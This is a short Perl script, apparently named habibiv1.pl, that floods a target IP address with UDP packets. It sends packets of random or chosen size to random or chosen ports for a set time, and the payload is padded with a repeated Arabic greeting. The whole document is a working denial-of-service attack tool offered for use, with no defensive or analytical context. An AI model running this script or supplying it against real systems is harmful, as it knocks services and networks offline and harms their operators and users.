use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "perl habibiv1.pl <IP> <PORT> <PACKETSIZE> <SECONDS>\n\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Incorrect $ip\n";
$endtime = time() + ($time ? $time : 9999999);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

print "UDP Flooding $ip " . ($port ? $port : "random") . " port with " .
  ($size ? "$size-byte" : "random size") . " packets" .
  ($time ? " for $time seconds" : "") . "\n";
print "Stop Attack with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, 
pack("a$psize","السلام عليكم ورحمة الله وبركاتهالسلام عليكم ورحمة الله وبركاتهالسلام عليكم ورحمة الله وبركاتهالسلام عليكم ورحمة الله وبركاتهالسلام عليكم ورحمة الله وبركاتهالسلام عليكم ورحمة الله وبركاتهالسلام عليكم ورحمة الله وبركاتهالسلام عليكم ورحمة الله وبركاتهالسلام عليكم ورحمة الله وبركاتهالسلام عليكم ورحمة الله وبركاتهالسلام عليكم ورحمة الله وبركاتهالسلام عليكم ورحمة الله وبركاته"), 
0, pack_sockaddr_in($pport, $iaddr));}